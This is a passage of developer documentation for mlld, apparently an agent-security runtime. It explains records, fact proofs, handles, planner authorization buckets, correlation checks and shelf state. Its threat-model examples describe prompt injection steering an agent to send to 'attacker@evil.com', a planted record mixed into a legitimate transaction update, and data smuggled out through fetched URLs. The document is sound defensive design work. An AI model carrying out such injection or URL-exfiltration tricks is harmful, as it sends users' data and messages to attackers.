**If a field contains values a downstream write tool needs as a control arg, it must be a fact, not data.** Data fields don't get fact proof. Selection beats re-derivation — preserve handle-bearing values in records and let the planner select from them via resolve tool calls.

### The user is the planner

In conversational agents, each user message is a micro-authorization. The agent is the worker. The security model is identical — the planner is just a human. User-typed literal values (recipient names, new times, exact subject lines) are `known` values from an uninfluenced source. See §6 for how to structure them in bucketed intent.

## 6. Records, Facts, and Handles

Labels and policies handle contamination (taint) — preventing untrusted data from reaching sensitive operations. But there's a second security question: **is this specific value from a trusted source?**

When an agent calls `sendEmail(recipient: "mark@example.com")`, did that email come from the contacts database or from an attacker's injected instructions? Taint tracking can't answer this. Facts and handles can.

Records are the primitive that answers this, and they work in two directions: they **classify tool output** (minting `fact:*` proof on coerced values via `=> record`) and they **validate tool input** (binding to a catalog entry via `inputs:` and checking args at dispatch). One grammar, two runtime roles. Tool input contracts live on input records bound to catalog entries — see `spec-input-records-and-tool-catalog.md` for the full spec.

### Records classify tool output

A record declares which fields are authoritative and which are just content:

```mlld
record @contact = {
  facts: [email: string, name: string, phone: string?],
  data: [notes: string?],
  read: [name, { mask: "email" }],
  when [
    internal => :internal
    * => :external
  ]
}

exe @searchContacts(query) = run cmd {
  contacts-cli search @query --format json
} => contact
```

- `facts` fields get `fact:` labels — the source is authoritative for these values
- `data` fields don't — they're content that could contain anything
- `when` assigns trust tiers from the data itself: `fact:internal:@contact.email` vs `fact:external:@contact.email`
- `read` controls what the LLM sees (see below)

**Trust refinement:** When `=> record` coercion runs on an `untrusted`-labeled exe result, `untrusted` is cleared on fact fields and `data.trusted` fields, and preserved on `data.untrusted` fields. `data: [fields]` is sugar for `data: { untrusted: [fields] }` — safe by default.

```mlld
record @issue = {
  facts: [id: string, author: string],
  data: {
    trusted: [title: string],
    untrusted: [body: string]
  }
}
```

Fact fields get proof AND taint cleared. Trusted data gets taint cleared but NO proof (safe to read, not authorization-grade). Untrusted data stays tainted. The `when` clause can conditionally promote data fields to trusted based on input values.

**Taint scoping:** When the tool has a bound input record with `facts:` entries, `no-untrusted-destructive` and `no-untrusted-privileged` scope their taint checks to those fact args only. Tainted data args (body, title, description) are expected LLM-composed payload in the planner-worker model and are not checked. Without a bound input record, all args are checked. Override with `taintFacts: true` on the exe, invocation, or policy rule to force all-arg checking.

### Read projections and handles

LLMs destroy value identity — they consume structured data as text and produce new JSON. The provenance is lost at the boundary.

`read` on a record controls what crosses the LLM boundary. Five modes:

| Mode | Syntax | LLM sees | Handle? |
|---|---|---|---|
| **Bare** | `name` | Full value | No |
| **Value** | `{ value: "name" }` | Full value + handle | Yes |
| **Masked** | `{ mask: "email" }` | Preview + handle | Yes |
| **Handle** | `{ handle: "id" }` | Handle only | Yes |
| **Protected** | `{ protected: "name" }` or not listed | Schema only | No |
| **Omitted** | `{ omit: "name" }` | Nothing | No |

Use `value` for fields the LLM needs to both see and reference in downstream tool calls:

```mlld
record @contact = {
  facts: [email: string, name: string],
  data: [notes: string?],
  read: [name, { value: "email" }]
}
```

Tool result at the LLM boundary:

```json
{
  "name": "Mark Davies",
  "email": { "value": "mark@example.com", "handle": "h_a7x9k2" }
}
```

The LLM passes the handle in tool calls or authorization:

```json
{ "recipient": "h_a7x9k2" }
{ "recipient": { "handle": "h_a7x9k2" } }
```

Both forms work. The runtime resolves `h_a7x9k2` back to the original live value with `fact:external:@contact.email` still attached. **Handles are per-call ephemeral** — each `@claude` invocation mints fresh handle strings via projection, and they are not portable across calls. The bridge resolves handles only against its own per-call mint table; a handle string captured from a prior call will not resolve in a later one. Cross-phase identity flows through the underlying values plus their factsources, not through handle strings — the planner-built `known` bucket and `@policy.build` reconcile values via the value-keyed proof claims registry, and the worker's freshly-minted handles for the same underlying value resolve correctly because they all point to identical content with identical fact labels. See `facts-and-handles` for the per-call ephemeral model and `builtins-ambient-mx` for the `@mx.handles` introspection accessor.

**Named read modes** let one record serve agents with different visibility needs:

```mlld
record @email_msg = {
  facts: [from: string, message_id: string],
  data: [subject: string, body: string, needs_reply: boolean],
  read: {
    role:worker: [{ mask: "from" }, subject, body],
    role:planner: [{ value: "from" }, { value: "message_id" }, needs_reply]
  }
}
```

Worker sees subject and body (its job), from is masked. Planner sees from and message_id as value (readable + handle), sees needs_reply, and sees unlisted fields as protected schema-only fields. Select the mode at box level (`box  with { read: "role:worker" } [...]`) or per LLM call (`(, { tools:  }) with { read: "role:worker" }`). Call-site overrides box-level. Overrides can only restrict.

In named modes, unlisted fields are protected. Use `{ omit: "field" }` only when the field existence should be hidden.

**Worker returns with `handle` field type** enforce handle-bearing cross-phase values:

```mlld
record @reader_result = {
  facts: [channel: handle],
  data: [summary: string]
}
```

The `handle` type requires a resolvable handle — plain strings fail validation. If the LLM returns a bare string instead of copying the handle, `=> record` validation fails and a guard can retry.

If no `read` declaration is present, fields are protected by default at the LLM boundary. Boundary resolution still applies — see the next subsection for the exact paths the runtime accepts.

### Handle resolution and the builder auto-upgrade

Boundary input canonicalization has been narrowed to two specific paths: per-call handle resolution at the bridge, and `@policy.build`'s value-keyed `known` → `resolved` auto-upgrade. Bare literals and masked previews are NOT accepted as substitutes for proof — there is no "if unique in the session" tolerance for either of them.

**Handle resolution at the bridge.** Inside an LLM call, the bridge's per-call mint table maps handle strings (`h_xxx`) to underlying values. Both forms work in control arg positions:

1. Handle wrapper: `{ "handle": "h_xxx" }` — resolves at the bridge for this call's mint table
2. Bare handle string: `"h_xxx"` — same path, same result

The bridge mint table is per-call — it does not retain handles from prior calls and does not consult any cross-call store. A handle from a prior call is dead in the current call. From orchestrator code outside an LLM call, handle strings are NOT looked up — pass the underlying labeled value directly (which carries its own proof via factsources).

**Builder value-keyed auto-upgrade.** `@policy.build` validates planner intent against the proof claims registry. When a `known` entry contains a value that already has a matching factsource in the registry, the builder auto-upgrades that entry to `resolved` with a freshly-minted handle for the worker's call. This is the cross-phase reconciliation path: the planner names a value (`{ value: "alice@example.com", source: "user said email alice" }`), the builder finds an existing factsource for that value, and the worker's dispatch sees a resolved handle without the planner having to know the worker's mint table.

**What is rejected:** bare literals like `"mark@example.com"` and masked previews like `"m***@example.com"` no longer resolve to fact values via canonicalization. If your code passes a string instead of a fact-bearing value or a handle, the dispatch sees a bare string with no proof and the positive check denies. Values the runtime never emitted with proof remain fresh literals.

**Why narrowed:** the older "tolerance" model accepted multiple emitted forms in the same session, but that meant fact resolution depended on session-wide string matching with edge cases (collisions, ambiguous masks, cross-call interference). Narrowing to handle-resolution + value-keyed builder auto-upgrade makes the security model deterministic and per-call clean.

### Positive checks

`no-send-to-unknown` and `no-destroy-unknown` are positive checks — they require proof on specific values rather than blocking contamination:

```mlld
policy @p = {
  defaults: {
    rules: ["no-send-to-unknown", "no-destroy-unknown"]
  },
  operations: {
    "exfil:send": ["tool:w:send_email"],
    "destructive:targeted": ["tool:w:delete_contact"]
  }
}
```

These rules require destination/target fact args to carry fact proof or `known` attestation. When the tool has a bound input record with `facts:`, any `fact:*` label on those fields satisfies the check. Without a bound input record, field-name heuristics apply (`fact:*.email` for sends, `fact:*.id` for deletes). Without proof, the call is denied regardless of what the LLM decided.

### Bucketed intent shape

The planner structures its authorization output by proof source. Three top-level buckets:

```json
{
  "resolved": {
    "send_email": { "recipients": "h_2l5r36" },
    "append_to_file": { "file_id": "h_upt8mo" }
  },
  "known": {
    "send_email": {
      "recipients": {
        "value": "john@example.com",
        "source": "user asked to email john"
      }
    }
  },
  "allow": {
    "create_file": true
  }
}
```

- **`resolved`** — values whose proof comes from a prior tool result (the planner saw a fact-bearing record and is naming the value to use). Accepts handle strings minted in a prior call's read projection, OR fact-bearing values passed directly from orchestrator code (the runtime walks the value's `factsources` to mint a fresh handle for the dispatching call). Bare literals with no proof are rejected.
- **`known`** — values the user explicitly provided in their task text. The runtime verifies the value appears in the task text via the `{ task: @query }` config to `@policy.build`. Optional `source` field for audit logging. Must come from uninfluenced sources only (the clean planner).
- **`allow`** — tools the planner authorizes with no per-arg constraints. Object form `{ tool: true }`. Works for tools regardless of whether they declare an input record with `facts:` — the planner is taking responsibility for the authorization at the tool level instead of per-arg.

The buckets are categories of *reasoning* (provenance) rather than categories of *values*. Each bucket maps to a different validation path inside `@policy.build`: handle/factsource resolution, task-text verification, or no-check. The runtime processes all three uniformly and emits a single compiled policy fragment.

**Where user-typed literal values go:** In `known`, keyed by the tool they satisfy. If the user's task is "reschedule my 2pm meeting to 3pm," then `event_id: <handle>` (from the resolve phase) goes in `resolved.reschedule_calendar_event.event_id` and `new_start_time: "15:00"` (from the user's task text) goes in `known.reschedule_calendar_event.new_start_time` with the `{task}` config supplying the text to verify against. The runtime validates both buckets against the tool's bound input record (`facts:` / `data:`) plus any legacy `updateArgs` / `exactPayloadArgs` on the exe. If your planner produces a separate `literal_inputs` field alongside `authorizations`, the orchestration (or framework) must merge it into `known` before calling `@policy.build`. Do not reimplement this as tool-metadata-aware JS — the `known` bucket is the primitive, use it.

**Don't mix flat and bucketed forms in the same intent.** `@policy.build` accepts pure-bucketed intent OR pure-flat intent (the lower-level explicit form), but not both at once — mixing produces a hard error rather than silently dropping entries. Use the bucketed form for planner-emitted intent; reserve the flat form for programmatic construction in framework code where you already have `{eq, attestations}` constraints in hand.

The entire bucketed intent must come from uninfluenced sources (the clean planner). Influenced workers (context worker, write worker) produce data for reasoning, not authorization intent. A context worker that processed untrusted content cannot populate any bucket. If the same tool+arg appears in both `resolved` and `known`, `resolved` wins.

### Derived and declarative fact requirements

For record-backed tool inputs, `@policy.build(...)` derives fact requirements from the input record's fact fields. The derivation order is:

1. `accepts: [...]` — exact pattern list, takes precedence over kind derivation
2. `kind: "email"` — accepts `known` plus every in-scope `fact:@record.field` tagged with the same exact kind
3. Untagged fact fields — strict fallback to `known` or `fact:*.<argName>`

There is no field-name normalization. `user_email` does not match `email` unless both fields share a `kind` tag, or an `accepts` override says so.

Policy can also declare fact requirements per operation and argument:

```json
{
  "facts": {
    "requirements": {
      "@email.send": {
        "recipient": ["fact:*.email"]
      }
    }
  }
}
```

Explicit policy entries override record-kind derivation for the same operation argument and still compose conjunctively with built-in rules.

### Input records: validating tool inputs

Input records are the structural contract for what values a tool accepts. Bind a record to a tool catalog entry with `inputs:` and the runtime walks its sections against the incoming arg map at dispatch:

```mlld
record @sendEmail_inputs = {
  facts: [recipient: string],
  data: [subject: string, body: string]
}

exe exfil:send @sendEmail(recipient, subject, body) = run cmd {
  email-cli send --to @recipient --subject @subject --body @body
}

var tools @writeTools = {
  send_email: {
    mlld: @sendEmail,
    inputs: @sendEmail_inputs,
    labels: ["exfil:send"],
    can_authorize: "role:planner"
  }
}
```

- `facts:` declares args that must carry `fact:*` proof or `known` attestation at dispatch. Subject to positive checks (`no-send-to-unknown`, `no-destroy-unknown`) and taint scoping (`no-untrusted-destructive`, `no-untrusted-privileged`).
- `data:` declares payload args. Split into `{ trusted, untrusted }` to mark which payload entries the runtime blocks when they carry `untrusted` vs which are expected LLM-composed.
- `?` marks optional fields (`cc: array?`). Optional facts participate in proof checks only when present.
- `handle` is a legal field type (`recipient: handle`) — requires a handle-bearing reference, rejects bare strings.

Input records are **validation schemas** — they never mint labels. Coercing into one via `=> record @sendEmail_inputs` is rejected. A record with `read:` is output-directed; a record with input-only sections (`correlate:`, `key:` with input shape) is input-directed; a record with neither may be used in both directions.

### Fact kinds and accepted proof

Fact fields can carry `kind` and `accepts` metadata using the config form `field: { type: ..., kind: ..., accepts: [...] }`. This metadata drives which proof patterns `@policy.build(...)` accepts for control args.

```mlld
record @contact = {
  facts: [
    email: { type: string, kind: "email" }
  ]
}

record @slack_msg = {
  facts: [
    sender: { type: string, kind: "slack_user_name" }
  ],
  data: [body: string]
}

record @invite_user_to_slack_inputs = {
  facts: [
    user: { type: string, kind: "slack_user_name" },
    user_email: { type: string, kind: "email" }
  ],
  validate: "strict"
}
```

`kind` matching is exact string equality on the producer and consumer fact fields. When the planner pins `invite_user_to_slack.user_email` to `fact:@contact.email`, the builder accepts it because both fields are `kind: "email"`. A pin to `fact:@slack_msg.sender` is rejected because `slack_user_name` is a different kind.

This is the canonical defense against the field-name-normalization bypass — `user_email` does **not** match `email` by string similarity. Authority is by declared kind, not by guessing.

Use `accepts` for narrow exceptions where one input field should accept an explicit pattern list instead of deriving from `kind`:

```mlld
record @send_email_inputs = {
  facts: [
    recipient: {
      type: string,
      kind: "email",
      accepts: ["known", "fact:*.email", "fact:@directory.list_email"]
    }
  ],
  validate: "strict"
}
```

`accepts` replaces the derived list for that field. Include `known` explicitly when known-attested values should still be allowed — it is not added implicitly. `accepts` is rejected on `data:` fields; `kind` and `accepts` are fact-field-only metadata.

`kind` tags do not change the labels minted on output values. A value from `record @contact = { facts: [email: { type: string, kind: "email" }] }` still carries `fact:@contact.email`. The kind tag is consumed downstream by the input-record's derivation rules.

### Correlating multi-fact tools

For write tools whose fact args must come from the same source record instance, declare `correlate: true` on the input record (or rely on the default — multi-fact records default to `correlate: true`, single-fact records to `false`):

```mlld
record @updateTransaction_inputs = {
  facts: [id: string, recipient: string],
  data: [amount: number, date: string],
  correlate: true,
  key: id
}

exe finance:w @updateTransaction(id, recipient, amount, date) = run cmd {
  bank-cli update @id --recipient @recipient --amount @amount --date @date
}

var tools @bankTools = {
  update_transaction: {
    mlld: @updateTransaction,
    inputs: @updateTransaction_inputs,
    labels: ["finance:w"]
  }
}
```

This is **structurally enforced at dispatch time** — not a prompt-level guideline. The runtime checks that every fact arg value's `factsources` provenance points to the same source record instance, matching by `instanceKey` (the record's `key:` field value) when available, or by `(coercionId, position)` for keyless records. Cross-record dispatches are denied with `Rule 'correlate-control-args': fact args on @<tool> must come from the same source record`. The check works on both orchestrator-side direct dispatches and LLM-bridge dispatched tool calls — there is no path that bypasses it.

**Key forms.** `key:` accepts a single field (`key: id`), a composite (`key: [account_id, period]`), or `key: hash(...)` for content-derived identity when no natural key exists. Every record-coerced object exposes the resulting `.mx.key` (opaque identity) and `.mx.hash` (deterministic content fingerprint over the non-key fields). Shelf upsert/from/remove and display projection caches address rows by `.mx.key`; `.mx.hash` is the right primitive for change detection ("did this row's content shift since I last looked?").

The canonical attack this defends: an attacker who controls one record (e.g., a planted "transaction to attacker@evil.com") tricks the planner into mixing that record's `recipient` with a legitimate record's `id`. Both individual values have fact proof, so single-arg checks like `no-send-to-unknown` pass. Without correlation, the dispatch goes through and updates the legitimate transaction with the attacker's recipient. With `correlate: true` on the input record, the comparator sees the cross-source mismatch and denies. See `policy-authorizations` for the full attack model and the re-fetch case (same logical record from separate calls is correctly allowed via `instanceKey` matching).

### Legacy: exe `with { controlArgs }` still works

The old `exe ... with { controlArgs: [...], correlateControlArgs: true }` shape is still accepted during the migration window and emits a deprecation warning. Port the data off the exe onto an input record bound to the catalog entry via `inputs:`. A single tool cannot mix shapes — use `inputs:` or `with { controlArgs: ... }`, not both.

### Automatic tool security annotations

The runtime automatically appends `<tool_notes>` to the system message for any `@claude()` call with security-relevant tools. This includes per-tool argument listings with fact args flagged, read/write classification derived from the active policy, `@fyi.known("toolName")` discovery calls, the deny list, and multi-fact correlation warnings. Annotations are inferred from the bound input records and the active policy — no orchestrator assembly needed.

For custom prompt assembly without `@claude()`, use `@toolDocs(@tools)`. The tool collection must be a labeled `var tools @x = {...}` declaration (the same shape `@policy.build` accepts), not a bare array of exe references:

```mlld
record @sendEmail_inputs = {
  facts: [recipient: string],
  data: [subject: string, body: string]
}

record @createFile_inputs = {
  facts: [],
  data: [path: string, content: string]
}

var tools @writeTools = {
  send_email: { mlld: @sendEmail,  inputs: @sendEmail_inputs,  labels: ["exfil:send"] },
  create_file: { mlld: @createFile, inputs: @createFile_inputs, labels: ["fs:w"] }
}

>> Render tool docs for prompt assembly. The output is the same canonical
>> form the runtime auto-injects into @claude() calls — no role-aware
>> branching, no "planner" or "worker" modes baked into the API.
var @docs = @toolDocs(@writeTools)

>> When the prompt asks the LLM to author bucketed authorization intent,
>> append the shape reference so it knows the structure @policy.build expects:
var @docsWithIntent = @toolDocs(@writeTools, { includeAuthIntentShape: true })
```

`@toolDocs` and `<tool_notes>` share the same rendering and classification path. The classifier is policy-derived: a tool renders as a write tool (in the "Write tools (require authorization)" section) if its bound input record has `facts:` entries, OR if its labels intersect any category in the active policy's `operations` map, OR if it appears in `policy.authorizations.deny`. There is no hardcoded label list — adding a custom write label like `iot:trigger` to your `policy.operations.destructive` makes `@toolDocs` pick it up automatically.

If the planner includes data args in the authorization (title, description, start_time, etc.), the runtime strips them at compilation time. The planner doesn't need to know which args are control args — it can include everything and the runtime only enforces what's security-relevant.

### Update args and exact payload args

Two additional exe metadata fields for write tool contracts:

```mlld
exe tool:w @updateScheduledTransaction(id, recipient, amount, date, subject, recurring) = [...]
  with {
    controlArgs: ["id", "recipient"],
    updateArgs: ["amount", "date", "subject", "recurring"],
    exactPayloadArgs: ["subject"]
  }
```

- `updateArgs` — which fields are actual changes. The runtime rejects update calls with no changed fields. The builder drops update tools authorized as bare `allow` when `updateArgs` is declared.
- `exactPayloadArgs` — which payload fields must appear in the user's task text. Validated by `@policy.build` when `{ task: @query }` is provided.

These compose with `controlArgs`: target identification (proof required) + actual changes (at least one required) + exact user text (must appear in task).

> **Migration note.** A future revision moves these onto the input record as top-level `update:` and `exact:` sections (peers of `facts:` / `data:` / `correlate:`). For now both concerns stay on the exe `with { ... }` clause; the new form isn't implemented yet. See `spec-input-records-and-tool-catalog.md` §2.1–§2.2 for the forward shape.

### Dynamic dispatch from tool collections

Tool collections support dynamic invocation by key with policy enforcement:

```mlld
var @auth = @policy.build(@step.authorizations, @writeTools)
show @writeTools[@step.write_tool](@step.args) with { policy: @auth.policy }
```

Policy matches against the **collection key**, not the underlying exe name. Arg objects are spread to named params using the bound input record's field order. No generated dispatch shims needed — the dispatcher invokes the real tool directly with the compiled policy applied.

Fact arg values must carry proof (handle, fact label, or `known` attestation). Proofless literals are rejected — the builder soft-drops them with feedback, hand-built `with { policy }` hard-fails.

### `resume` for write worker output repair

When a write worker calls tools successfully but produces malformed final output (prose instead of JSON), use `resume` instead of `retry`. `retry` re-executes tool calls. `resume` continues the LLM conversation — the model sees its prior tool calls and reformats:

```mlld
guard after @fixShape for op:named:executeWorker = when [
  @output.mx.schema.valid == false && @mx.guard.try < 2
    => resume "Return valid JSON. Errors: @output.mx.schema.errors"
  @output.mx.schema.valid == false => deny "Still invalid"
  * => allow
]
```

Guard action precedence: `deny > resume > retry > allow`. Use `retry` for planners and read-only workers. Use `resume` for write workers.

**Resume invariants (load-bearing for handle safety).** A resumed call runs with `tools = []` and the auto-provisioned `@shelve` tool disabled. These are not optimizations — they are structural constraints. Per-call handle strings die with their call (handles are per-call ephemeral); the conversation history that resume replays still contains handle strings from the prior turn, but those handles are dead by the time the resume runs because the new call's bridge has its own mint table. If the resumed call could fire tools or shelve writes, the LLM might paste a handle from the prior turn into a fresh tool call, and that handle would not resolve. Forcing `tools = []` and disabling auto-provisioned shelve eliminates the failure mode at the structural level. **`resume` fixes the LLM's text or JSON output, not its tool calls.** If you want the LLM to take more actions, that is a new step in the orchestration loop — not a resume. Use `retry` (which starts a fresh call with a fresh mint table) when re-attempting the entire operation, but be careful: retry re-fires write tools, so it is dangerous for exes that send email, create issues, or otherwise have side effects.

### Authorization deny list and policy builder

`authorizations.deny` prevents specific tools from ever being planner-authorized:

```mlld
policy @base = {
  authorizations: {
    deny: ["update_password", "update_user_info"]
  }
}
```

`@policy.build(@intent, @tools, { task: @query })` validates planner intent against tool metadata and policy. The canonical input is the bucketed shape (`resolved`/`known`/`allow`); a lower-level flat shape (`{toolName: {argName: {eq, attestations}}}`) is also accepted for programmatic construction. Mixing the two in a single intent is rejected with a hard error.

```mlld
var @plannerResult = @plan(@task) | @parse
var @auth = @policy.build(@plannerResult.authorizations, @writeTools, { task: @task })
var @result = @worker(@task) with { policy: @auth.policy }
```

The builder returns `{ policy, valid, issues, report }`:

- `policy` — validated auth fragment, use directly with `with { policy }`
- `valid` — boolean
- `issues` — what was dropped and why (`denied_by_policy`, `proofless_resolved_value`, `proofless_control_arg`, `known_from_influenced_source`, `requires_control_args`, etc.)
- `report` — detailed compile diagnostics (stripped args, repaired args, compiled proofs)

For each `resolved` entry the builder walks the value's factsources (or, for handle strings, the bridge's mint table) to compile a fact-attestation; bare literals with no proof are rejected as `proofless_resolved_value`. For each `known` entry the builder verifies the value appears in the task text and emits a `known` attestation; values that don't appear in the task fail as `payload_not_in_task`. For each `allow` entry the builder authorizes the tool unconditionally at the tool level (regardless of whether its input record declares `facts:`). Array-typed fact args are checked per element. The builder also auto-upgrades `known` → `resolved` when an exact value match exists in the proof claims registry — that's the cross-phase reconciliation path.

Use `@policy.validate` in a guard to retry the planner when its auth has issues:

```mlld
guard after @validateAuth for op:named:plan = when [
  @policy.validate(@output, @writeTools).valid == false && @mx.guard.try < 2
    => retry "Fix: @policy.validate(@output, @writeTools).issues"
  * => allow
]
```

**Composition.** `with { policy: @p }` composes additively with the env's active policy by default — capability allow lists, rules, labels, operations, authorizations, and locked flags from both layers merge, with locked rules from the env preserved through the merge. This is the planner-opens-hole pattern in action: a script-level base policy declares the agent's broad capabilities and locked guarantees, and a per-step `@auth.policy` from `@policy.build` adds the specific exemption the planner authorized. Pass an array form `with { policy: [@agent.basePolicy, @auth.policy] }` to make the composition explicit when both layers should be applied — useful when the env's active policy isn't the right base or when threading the composition through dispatcher code that doesn't have access to the active env.

Use `with { policy: @p, replace: true }` as the explicit escape hatch when you want sandbox semantics — `replace: true` skips composition entirely and uses `@p` as the dispatch's only policy, including dropping locked rules from the env. Reserved for trusted infrastructure boundaries; the additive default is what you want for the planner-worker pattern. `merge` is the implicit default and not a literal flag — `with { policy: @p }` already means "merge with env."

### Example: Full provenance flow

```mlld
record @contact = {
  facts: [email: string, name: string],
  data: [notes: string?],
  read: [name, { mask: "email" }]
}

record @sendEmail_inputs = {
  facts: [recipient: string],
  data: [subject: string, body: string]
}

exe @searchContacts(query) = run cmd {
  contacts-cli search @query --format json
} => contact

exe exfil:send @sendEmail(recipient, subject, body) = run cmd {
  email-cli send --to @recipient --subject @subject --body @body
}

var tools @writeTools = {
  send_email: {
    mlld: @sendEmail,
    inputs: @sendEmail_inputs,
    labels: ["exfil:send"],
    can_authorize: "role:planner"
  }
}

policy @p = {
  defaults: {
    rules: ["no-send-to-unknown", "no-untrusted-destructive"]
  },
  operations: { "exfil:send": ["exfil:send"] }
}
```

The agent calls `@searchContacts("Mark")`, gets a projected result with a handle for the email. It puts that handle in an authorization or tool call. The runtime resolves it, checks fact proof on the control arg, and allows the send.

If injection tricks the agent into using `attacker@evil.com` — a value the runtime never emitted — the value has no proof and the send is denied.

### URL exfiltration defense

HTTP GET is a covert write channel — data encoded in a URL is transmitted by the fetch itself. Read projections prevent this for masked facts (the LLM can't encode what it can't see). For bare-visible facts, `no-novel-urls` closes the channel:

```mlld
policy @p = {
  defaults: {
    rules: ["untrusted-llms-get-influenced", "no-novel-urls"]
  }
}
```

Any URL in an `influenced` tool-call argument must exist verbatim in a prior tool result or user payload. Constructed URLs are blocked regardless of encoding. Use `urls.allowConstruction` to allowlist domains where constructed URLs are acceptable (search engines, internal APIs).

URL-fetching tools use `exfil:fetch` (not `exfil:send`):

```mlld
record @getWebpage_inputs = {
  facts: [url: string]
}

exe exfil:fetch @getWebpage(url) = run cmd {
  curl -s @url
}

var tools @readTools = {
  get_webpage: { mlld: @getWebpage, inputs: @getWebpage_inputs, labels: ["exfil:fetch"] }
}
```

---

## 7. Shelf Slots: Typed State Accumulation

Agents accumulate state — candidate lists, selections, drafts, pipeline stages. Shelf slots are the typed surface for this.

```mlld
shelf @outreach = {
  recipients: contact[],
  selected: contact? from recipients,
  drafts: email_draft[]
}
```

Each slot is typed by a record. The record provides schema, grounding, and read projection. The shelf adds merge (field-merge upsert by `.mx.key`, append, or replace), cross-slot constraints (`from`), version metadata, and access control. Wildcard shelves create virtual `record_type[]` slots from a record set, tool collection `returns:` metadata, or bare `*`; bounded scopes can grant access with `@state.*`.

**Grounding is stricter than tool calls.** Agent writes to fact fields require handle-bearing input only — masked previews and bare literals are rejected. Durable state gets durable references.

**Cross-slot constraints** prevent hallucinated selections. `selected: contact? from recipients` means the agent can't select a winner that was never a candidate.

**Access control via box config.** A box declares which slots its inner LLM call can read or write. Two equivalent forms:

```mlld
>> Literal form — slot refs listed inline
box @researcher with {
  shelf: { write: [@outreach.recipients] }
} [...]

box @decider with {
  shelf: {
    read: [@outreach.recipients],
    write: [@outreach.selected]
  }
} [...]

>> Value form — scope built as a regular variable, then passed in
var @decisionScope = {
  read: [@outreach.recipients],
  write: [@outreach.selected]
}
box @decider with { shelf: @decisionScope } [...]
```

The value form lets framework code construct shelf scopes dynamically without parser-level magic — a generic dispatcher can build the scope from the developer's shelf shape and pass it through.

**Aliases default to the slot's declared name.** `@outreach.recipients` in the box config exposes the slot to the LLM as `@fyi.shelf.recipients` (and as the alias `recipients` in the auto-provisioned `@shelve` tool). Renaming is optional cosmetic via `as <alias>`:

```mlld
box @decider with {
  shelf: { read: [@outreach.recipients as candidates] }
} [...]
```

Use `as <alias>` only when you want a role-based name distinct from the declared slot name. The common case is "agent sees the slot under whatever name the developer chose."

**Auto-provisioned `@shelve` tool.** When a box has writable shelf scope, the runtime auto-injects a synthetic `shelve` MCP tool into the LLM's tool surface alongside whatever tools the call already declared. The agent doesn't need `shelve` listed in the box's `tools:` config — presence of writable shelf scope is sufficient. The LLM calls `shelve` like any other MCP tool, addressing the slot by alias name. The MCP tool's input schema constrains `slot_alias` to an enum of the box's writable aliases — the LLM cannot write to a slot the box didn't expose. The runtime resolves the alias to the underlying slot value and runs the normal write pipeline (handle resolution → schema validation → grounding check → merge → source labeling).

**The dispatcher pattern** for moving data between phases:

1. Orchestrator pre-reads upstream slot state via `@shelf.read(@agent.shelf[@value.slot])` and passes the typed values into the next phase's prompt as variables
2. Worker LLM reads its inputs from the prompt and acts on them
3. If the worker needs to commit something to a slot, it calls the auto-provisioned `shelve` tool with the alias the box exposed
4. After the box closes, the orchestrator reads the slot back via `@shelf.read` for downstream phases

The box's `read:` scope supports cross-slot `from` constraint enforcement (so a "winner" slot can only contain values present in a "candidates" slot) even when the worker reads contents via the prompt variable rather than via `@fyi.shelf` interpolation.

**Trust model:** slots don't mint facts. `known` doesn't persist in slots. Writes are atomic. Authority comes from the original records and `=> record` coercion — the shelf preserves proof, it doesn't create it.

Shelf I/O preserves the full structured proof carrier through round-trips: a value written to a slot and read back retains its labels, factsources (including `instanceKey`, `coercionId`, `position`), and source-record provenance. Cross-phase identity passed via shelves is durable end-to-end — a planner writes a fact-bearing target, the worker reads it, and the resolved value still carries the same factsources for downstream `correlate-control-args` and positive checks to consume.

**Wildcard shelves.** Three forms cover the common "I don't want to enumerate every slot upfront" cases:

```mlld
>> Bounded by a record set — virtual record_type[] slot per accepted record
var @records = { contact: @contact, draft: @draft }
shelf @state from @records

>> Bounded by a tool collection's returns: metadata
var tools @resolveTools = {
  search_contacts: { mlld: @searchContacts, returns: @contact }
}
shelf @plannerState from @resolveTools

>> Bare wildcard — accepts any record type known when the slot is accessed
shelf @scratch = *
```

`from @records` accepts an object whose values are record definitions and pre-creates virtual empty `record_type[]` slots (`@state.contact`, `@state.draft`). `from @resolveTools` accepts a tool collection; every tool in the collection must declare `returns: @record`, and the union of those records becomes the bound. Bare `*` accepts any record type known at access time.

Box scopes use `@s.<record_type>` for a specific accepted type or `@s.*` to match all of them:

```mlld
box {
  shelf: {
    read: [@state.*],
    write: [@state.*]
  }
} [...]
```

For bounded wildcards `@state.*` expands over the accepted virtual slots. For bare `*` shelves it grants future writes for record types known when the slot is accessed.

Wildcard slots are written and read through the same `@shelf` API — there is no `shelf @x <- @value` syntax:

```mlld
@shelf.write(@state.contact, @contactValue)
@shelf.read(@state.contact)
```

**Field-merge upsert.** All `record[]` slots (static and wildcard) merge by `.mx.key`: incoming non-null fields replace stored fields, incoming missing or null fields leave the stored field unchanged. Use the expanded form when you want append-only history: `log: { type: contact[], merge: "append" }`.

**Versioning.** `@someShelf.mx.version` returns the shelf rollup version; `@someShelf.someSlot.mx.version` returns the per-slot version. Both increment on writes and are useful for cache invalidation in dispatcher loops.

---

## 8. Per-Call Session Containers

Where shelf slots accumulate state across an entire script execution, **session containers accumulate state for the lifetime of a single LLM call**. Every tool callback dispatched by that call sees the same instance; the instance dies when the call exits. This is the right primitive for budgets, counters, terminal-tool latches, execution logs, and any per-conversation accumulator that must not leak across concurrent or nested calls.

### Declaration

```mlld
record @plannerRuntime = {
  data: [tool_calls: number, invalid_calls: number, terminal: string?, last_decision: string?]
}

var session @planner = {
  agent: object,
  query: string,
  state: object,
  runtime: @plannerRuntime
}
```

The declaration is a labeled var — peer with `var tools`. The RHS is a JSON-shaped object whose values are types: primitives (`string`, `number`, `boolean`, `object`, `array`), record references (`@recordName`), typed arrays (`@recordName[]`), and the optional suffix (`?`). The var binds to the schema; live instances are materialized per call.

Records used as session slot types must be input-style — no `read:` or `when:` sections. Sessions are accumulators, not proof sources.

### Attachment and seed

Attach to an LLM-calling exe via `with`:

```mlld
exe llm @runPlanner(agent, query, prompt) = @claude(@prompt, { ... }) with {
  session: @planner,
  seed: { agent: @agent, query: @query }
}
```

`seed:` writes initial values into the freshly materialized instance — through the normal type-validated write path — before the first tool callback runs. Required slots without a seed entry raise `MlldSessionRequiredSlotError` on first read.

**Wrapper-owned default.** When both a wrapper and a caller specify `session:`, the wrapper wins. Caller override requires explicit opt-in: `with { session: @alt, override: "session" }`. Without the override flag, the conflict raises at the `with` merge layer. This protects framework invariants from accidental caller-side replacement.

### Access API

Inside any tool callback dispatched by a frame that attached `@planner`, the declared name resolves to the live instance:

```mlld
